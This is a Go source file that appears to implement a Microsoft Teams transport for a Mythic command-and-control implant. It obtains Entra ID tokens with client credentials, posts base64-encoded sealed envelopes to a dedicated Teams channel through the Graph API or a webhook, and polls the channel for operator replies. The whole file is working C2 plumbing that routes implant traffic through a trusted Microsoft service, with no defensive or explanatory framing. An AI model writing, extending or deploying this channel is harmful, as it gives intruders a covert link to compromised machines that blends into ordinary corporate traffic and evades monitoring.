package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// Mythic msteams profile client: OAuth2 client-credentials against Entra ID,
// base64 envelopes posted as Teams channel messages via the Graph API (or an
// AdaptiveCard webhook when configured), replies picked up by polling.
// Operates on a dedicated channel; any foreign message would look like a reply.
type teamsTransport struct {
	client      *http.Client
	tenant      string
	clientID    string
	secret      string
	teamID      string
	channelID   string
	webhook     string
	userAgent   string
	token       string
	tokenExpiry time.Time
	ownIDs      map[string]bool
}

// No graph_base/login_base profile parameters exist; these mirror the C2
// server defaults. Tests override them.
var teamsGraphBase = "https://graph.microsoft.com/v1.0"
var teamsLoginBase = "https://login.microsoftonline.com"

func newTeamsTransport(c Config) (*teamsTransport, error) {
	for k, v := range map[string]string{
		"tenant_id": c.TenantID, "client_id": c.ClientID, "client_secret": c.ClientSecret,
		"team_id": c.TeamID, "channel_id": c.ChannelID,
	} {
		if v == "" {
			return nil, fmt.Errorf("teams %s is empty", k)
		}
	}
	client, err := newHTTPClient(c.ProxyHost, c.ProxyPort, c.ProxyUser, c.ProxyPass)
	if err != nil {
		return nil, err
	}
	return &teamsTransport{
		client: client, tenant: c.TenantID, clientID: c.ClientID, secret: c.ClientSecret,
		teamID: c.TeamID, channelID: c.ChannelID, webhook: c.WebhookURL,
		userAgent: c.UserAgent, ownIDs: map[string]bool{},
	}, nil
}

func (t *teamsTransport) exchange(sealed []byte) ([]byte, error) {
	body := base64.StdEncoding.EncodeToString(sealed)
	known, err := t.listIDs()
	if err != nil {
		return nil, err
	}
	sentID, err := t.send(body)
	if err != nil {
		return nil, err
	}
	if sentID != "" {
		t.ownIDs[sentID] = true
		if len(t.ownIDs) > 500 {
			t.ownIDs = map[string]bool{sentID: true}
		}
	}
	reply, err := t.poll(known, body)
	if err != nil {
		return nil, err
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(reply))
	if err != nil {
		return nil, fmt.Errorf("teams reply: %w", err)
	}
	return raw, nil
}

func (t *teamsTransport) auth() (string, error) {
	if t.token != "" && time.Now().Add(60*time.Second).Before(t.tokenExpiry) {
		return t.token, nil
	}
	form := url.Values{
		"grant_type":    {"client_credentials"},
		"scope":         {"https://graph.microsoft.com/.default"},
		"client_id":     {t.clientID},
		"client_secret": {t.secret},
	}
	endpoint := fmt.Sprintf("%s/%s/oauth2/v2.0/token", teamsLoginBase, t.tenant)
	req, err := http.NewRequest(http.MethodPost, endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if t.userAgent != "" {
		req.Header.Set("User-Agent", t.userAgent)
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	out, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("teams auth status %d", resp.StatusCode)
	}
	var parsed struct {
		AccessToken string `json:"access_token"`
		ExpiresIn   int    `json:"expires_in"`
	}
	if err := json.Unmarshal(out, &parsed); err != nil {
		return "", err
	}
	if parsed.AccessToken == "" {
		return "", fmt.Errorf("teams auth: empty token")
	}
	if parsed.ExpiresIn <= 0 {
		parsed.ExpiresIn = 3600
	}
	t.token = parsed.AccessToken
	t.tokenExpiry = time.Now().Add(time.Duration(parsed.ExpiresIn) * time.Second)
	return t.token, nil
}

func (t *teamsTransport) messagesURL() string {
	return fmt.Sprintf("%s/teams/%s/channels/%s/messages", teamsGraphBase, t.teamID, t.channelID)
}

func (t *teamsTransport) graphReq(method, url string, payload any) (*http.Request, error) {
	token, err := t.auth()
	if err != nil {
		return nil, err
	}
	var body io.Reader
	if payload != nil {
		raw, err := json.Marshal(payload)
		if err != nil {
			return nil, err
		}
		body = bytes.NewReader(raw)
	}
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	if t.userAgent != "" {
		req.Header.Set("User-Agent", t.userAgent)
	}
	return req, nil
}

// send posts the envelope, returning the Graph message id ("", nil) for
// webhook sends which carry no id.
func (t *teamsTransport) send(body string) (string, error) {
	if t.webhook != "" {
		return "", t.sendWebhook(body)
	}
	req, err := t.graphReq(http.MethodPost, t.messagesURL(), map[string]any{
		"body": map[string]string{"contentType": "text", "content": body},
	})
	if err != nil {
		return "", err
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	out, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("teams send status %d", resp.StatusCode)
	}
	var parsed struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal(out, &parsed); err != nil {
		return "", err
	}
	if parsed.ID == "" {
		return "", fmt.Errorf("teams send: empty id")
	}
	return parsed.ID, nil
}

func (t *teamsTransport) sendWebhook(body string) error {
	card, err := json.Marshal(map[string]any{
		"$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
		"type":    "AdaptiveCard", "version": "1.2",
		"body": []any{map[string]any{"type": "TextBlock", "text": body, "wrap": true}},
	})
	if err != nil {
		return err
	}
	payload := map[string]any{"type": "message", "attachments": []any{map[string]any{
		"contentType": "application/vnd.microsoft.card.adaptive",
		"contentUrl":  nil, "content": string(card),
	}}}
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, t.webhook, bytes.NewReader(raw))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	if t.userAgent != "" {
		req.Header.Set("User-Agent", t.userAgent)
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusAccepted {
		return fmt.Errorf("teams webhook status %d", resp.StatusCode)
	}
	return nil
}

type teamsMessage struct {
	ID   string `json:"id"`
	Type string `json:"messageType"`
	Body struct {
		Content string `json:"content"`
	} `json:"body"`
}

func (t *teamsTransport) list() ([]teamsMessage, error) {
	req, err := t.graphReq(http.MethodGet, t.messagesURL()+"?$top=10", nil)
	if err != nil {
		return nil, err
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	out, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("teams list status %d", resp.StatusCode)
	}
	var parsed struct {
		Value []teamsMessage `json:"value"`
	}
	if err := json.Unmarshal(out, &parsed); err != nil {
		return nil, err
	}
	return parsed.Value, nil
}

func (t *teamsTransport) listIDs() (map[string]bool, error) {
	msgs, err := t.list()
	if err != nil {
		return nil, err
	}
	known := map[string]bool{}
	for _, m := range msgs {
		known[m.ID] = true
	}
	return known, nil
}

// poll waits for the first new message that is not ours. Webhook sends carry
// no id, so our own post is also skipped by content match.
func (t *teamsTransport) poll(known map[string]bool, sent string) (string, error) {
	deadline := time.Now().Add(90 * time.Second)
	for {
		msgs, err := t.list()
		if err != nil {
			return "", err
		}
		for _, m := range msgs {
			if m.ID == "" || known[m.ID] || t.ownIDs[m.ID] {
				continue
			}
			content := strings.TrimSpace(m.Body.Content)
			if m.Type != "message" || content == "" || content == sent {
				continue
			}
			return content, nil
		}
		if time.Now().After(deadline) {
			return "", fmt.Errorf("teams poll timed out")
		}
		time.Sleep(3 * time.Second)
	}
}
